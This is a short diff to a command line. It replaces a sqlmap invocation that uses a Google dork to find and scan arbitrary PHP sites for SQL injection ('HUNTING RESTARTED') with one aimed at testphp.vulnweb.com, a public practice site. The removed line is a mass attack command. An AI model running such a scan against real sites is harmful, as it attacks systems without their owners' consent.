@@ -1,2 +1,1 @@
-# ऑटो-पायलट मोड चालू करें
-python3 sqlmap/sqlmap.py -g "inurl:.php?id=" --batch --smart --random-agent --output-dir=results_folder && echo "HUNTING RESTARTED - CHECKING NEW NODES"
+python3 sqlmap/sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --banner && echo "DONE" > results.txt
